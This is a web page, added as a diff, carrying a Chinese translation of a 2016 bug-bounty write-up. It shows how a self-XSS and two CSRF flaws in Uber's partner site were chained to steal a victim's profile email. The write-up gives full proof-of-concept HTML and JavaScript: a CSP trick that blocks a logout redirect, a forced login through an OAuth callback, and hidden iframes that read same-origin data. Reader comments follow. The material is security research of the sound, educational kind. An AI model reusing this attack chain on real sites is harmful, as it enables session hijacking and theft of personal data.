@@ -1,0 +1,57 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Uber三个鸡肋漏洞的妙用</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">virusdefender</a> <span class="bull">·</span> <time title="2016/03/25 10:43" ui-time="" datetime="2016/03/25 10:43" class="published ng-binding ng-isolate-scope">2016/03/25 10:43</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 简介</h1><hr><p>作者通过精心设计，将一个鸡肋的的self-XSS和两个鸡肋的csrf变成了一个高质量的漏洞。</p><p>原文：<br><a href="https://fin1te.net/articles/uber-turning-self-xss-into-good-xss/">https://fin1te.net/articles/uber-turning-self-xss-into-good-xss/</a></p><p>在Uber一个设置个人信息的页面上，我找到一个非常简单且经典的XSS漏洞。设置项中随便修改一个字段为<code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code>就可以执行并弹框。</p><p><img alt="uber-partners-xss-1-1" img-src="bfb7eeb6efde34fdcdc1b4a5809fb9aceb0eb10c.jpg"></p><p><img alt="uber-partners-xss-1-1" img-src="d1bcf45cdc239e2cc77a1f862215ae729879bb27.jpg"></p><p>一共花了两分钟找到这个漏洞，但是我们要来点更有意思的。</p><h1>0x01 self-XSS</h1><hr><p>可以在网页中运行外界可控的任意JS脚本就被称为XSS漏洞，这时候你一般可以去读取其他用户的Cookies，或者发出一些请求。但是如果你只能对自己做这些，而不是其他用户，比如这段代码只会在你能看到的页面里面运行，这就被称为self-XSS。这种情况下，即使我们发现了漏洞，也很难去影响其他人。</p><p>我犹豫了一会，但是我后来决定试试，看能不能去掉这个"self"。</p><h1>0x02 Uber OAuth 登录流程</h1><hr><p>Ubser的OAuth登录流程也是很经典的</p><ul><li>用户访问Uber某个需要登录的网站，比如<code>partners.uber.com</code></li><li>用户被重定向到授权服务器，比如<code>login.uber.com</code></li><li>用户输入账号密码</li><li>用户重定向回到<code>partners.uber.com</code>，同时URL中携带<code>code</code>，可以用来换取Access Token</li></ul><p><img alt="uber-partners-xss-2" img-src="3699206542f721f620e311962e076e8d831ed53f.jpg"></p><p>从上面的截图你可以看到，OAuth的回调地址<code>/oauth/callback?code=...</code>并没有使用标准推荐的<code>state</code>参数，这意味着登录功能存在CSRF的问题，但是不好说会不会造成严重的问题。</p><p>同时，在退出登录的地方也有一个CSRF漏洞，当然这一般不会认为是漏洞。访问<code>/logout</code>会清除用户<code>partner.uber.com</code>的session，然后再重定向到<code>login.uber.com</code>的退出登录页面，清除<code>login.uber.com</code>的session。</p><p>因为我们的payload只存在于自己的账号中，我们可以让其他用户登录进我们的账号，然后payload就会执行，不过登录我们的账号会清除他们之前所有的session，这就让漏洞大打折扣了。所以我们要把漏洞放在一起利用。</p><h1>0x03 捆绑利用漏洞</h1><hr><p>我们的计划就是这样的了</p><ul><li>首先，让用户登出<code>partner.uber.com</code>，但是不要登出<code>login.uber.com</code>，这样后面可以让用户重新回到原有账号</li><li>然后，让用户登录我们的账号，这样payload就会执行</li><li>最后，用户登录自己的账号，但是我们的payload仍然在运行，这样就可以盗取信息了</li></ul><h3>第一步 只在一个域名退出登录</h3><p>首先发送一个请求到<code>https://partners.uber.com/logout/</code>，然后就可以登录我们的账号了。但是问题在于退出登录的重定向最终会到达<code>https://login.uber.com/logout/</code>，导致另外一个域名也退出登录。我们能不能控制呢？</p><p>我的方法就是使用Content Security Police来设置可以加载的域名。我只设置了允许请求<code>partners.uber.com</code>，<code>login.uber.com</code>就会被浏览器拦截。</p><pre><code>#!html
+&lt;!-- 设置CSP策略阻止访问 login.uber.com --&gt;
+&lt;meta http-equiv="Content-Security-Policy" content="img-src https://partners.uber.com"&gt;
+&lt;!-- 退出登录 partners.uber.com --&gt;
+&lt;img src="https://partners.uber.com/logout/"&gt;
+</code></pre><p>这样是可以的，CSP会有下面的提示</p><p><img alt="uber-partners-xss-3" img-src="8503b6c0ca08e58de8f20095d5afe845ddb9cdfe.jpg"></p><h3>第二步 登录我的账号</h3><p>这一步相对来说简单了一些，我们向<code>https://partners.uber.com/login/</code>发送一个请求（这一步是必须的，否则我们没法接收到回调）。上面我们用了CSP的trick来阻止部分流程，这里我们就需要用我自己的<code>code</code>来让用户登录了。</p><p>因为CSP会触发<code>onerror</code>，我们就可以在那里面跳转到下一步了。</p><pre><code>#!html
+&lt;!-- CSP策略会阻止访问 login.uber.com --&gt;
+&lt;meta http-equiv="Content-Security-Policy" content="img-src partners.uber.com"&gt;
+&lt;!-- 退出登录 partners.uber.com，在跳转到login.iber.com的时候触发onerror --&gt;
+&lt;img src="https://partners.uber.com/logout/" onerror="login();"&gt;
+&lt;script&gt;
+    //初始化登录
+    var login = function() {
+        var loginImg = document.createElement('img');
+        loginImg.src = 'https://partners.uber.com/login/';
+        loginImg.onerror = redir;
+    }
+    //用我们的code登录
+    var redir = function() {
+        // 为了方便测试，code放在url hash中，实际需要动态的获取
+        var code = window.location.hash.slice(1);
+        var loginImg2 = document.createElement('img');
+        loginImg2.src = 'https://partners.uber.com/oauth/callback?code=' + code;
+        loginImg2.onerror = function() {
+            window.location = 'https://partners.uber.com/profile/';
+        }
+    }
+&lt;/script&gt;
+</code></pre><h3>第三步 回到原来的账号</h3><p>这一部分的代码将会有XSS的payload，在我的账号中。</p><p>只要payload一运行，就可以切换回原来的账号了。这个必须在iframe中，因为需要保持payload一直运行。</p><pre><code>#!js
+// 创建一个iframe，让用户退出登录我的账号
+var loginIframe = document.createElement('iframe');
+loginIframe.setAttribute('src', 'https://fin1te.net/poc/uber/login-target.html');
+document.body.appendChild(loginIframe);
+</code></pre><p>iframe里面还是用CSP的trick</p><pre><code>#!js
+&lt;meta http-equiv="Content-Security-Policy" content="img-src partners.uber.com"&gt;
+&lt;img src="https://partners.uber.com/logout/" onerror="redir();"&gt;
+&lt;script&gt;
+    //使用用户login.uber.com的session重新登录
+    var redir = function() {
+        window.location = 'https://partners.uber.com/login/';
+    };
+&lt;/script&gt;
+</code></pre><p>最后一部分是创建另外一个iframe，这样可以获取一些数据了</p><pre><code>#!js
+//等待几秒，加载个人信息页面，这是用户原始的信息
+setTimeout(function() {
+    var profileIframe = document.createElement('iframe');
+    profileIframe.setAttribute('src', 'https://partners.uber.com/profile/');
+    profileIframe.setAttribute('id', 'pi');
+    document.body.appendChild(profileIframe);
+    //提取email信息
+    profileIframe.onload = function() {
+        var d = document.getElementById('pi').contentWindow.document.body.innerHTML;
+        var matches = /value="([^"]+)" name="email"/.exec(d);
+        alert(matches[1]);
+    }
+}, 9000);
+</code></pre><p>因为我们最终的这个iframe是在个人信息页面加载的，是同源的，而且<code>X-Frame-Options</code>也是设置的<code>sameorigin</code>而不是<code>deny</code>，所以我们使用<code>contentWindow</code>是可以访问到里面的内容的。</p><p><img alt="uber-partners-xss-5" img-src="0bf50a232ec72274536a55d48f25cfdde5a9ea26.jpg"></p><h3>综合在一起</h3><ul><li>将第3步payload加入个人信息中</li><li>登录自己的账号，取消回调，拿到还未用过的<code>code</code></li><li>让用户访问我们在第2步中创建的页面</li><li>这样用户就会退出登录，然后重新登录到我的账号</li><li>第3步的payload就会执行</li><li>在隐藏的iframe中，退出登录我的账号</li><li>在另外一个隐藏的iframe中，重新登录用户的账号</li><li>这样我们就有了一个同源的有用户session的iframe了</li></ul><p>这个漏洞很有意思，启发我们要在一个更高的层面去挖掘和思考安全漏洞。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/201606171951203a344ec0aa4403d47ce37c14601de3a1.jpg" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">do9gy</span> <span class="reply-time">2016-05-04 10:29:57</span></div><p></p><p>忍不住Mark一下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zjhiphop</span> <span class="reply-time">2016-04-22 10:30:59</span></div><p></p><p>吊， 学习一下这个案例</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ca1n</span> <span class="reply-time">2016-04-03 13:34:06</span></div><p></p><p>CSP这个学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">px1624</span> <span class="reply-time">2016-03-27 23:39:13</span></div><p></p><p>其实危害不大，因为uber的web版基本就没人用吧。然后app版本根本就没有和别人交互的接口，也就没法中招了~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mramydnei</span> <span class="reply-time">2016-03-26 03:09:37</span></div><p></p><p>据说Uber的奖金不错</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">jye33</span> <span class="reply-time">2016-03-25 22:45:45</span></div><p></p><p>叼，真是好文章</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Z</span> <span class="reply-time">2016-03-25 15:11:01</span></div><p></p><p>@Manning 右手中指？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">隐形人真忙</span> <span class="reply-time">2016-03-25 13:50:07</span></div><p></p><p>CSP的trick很精彩啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">滴滴一下</span> <span class="reply-time">2016-03-25 12:13:54</span></div><p></p><p>默默回去修漏洞。。。</p><p>周末又没了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Manning</span> <span class="reply-time">2016-03-25 11:06:15</span></div><p></p><p>我扶了下眼镜</p><p></p></div></div></div></div></div></main>
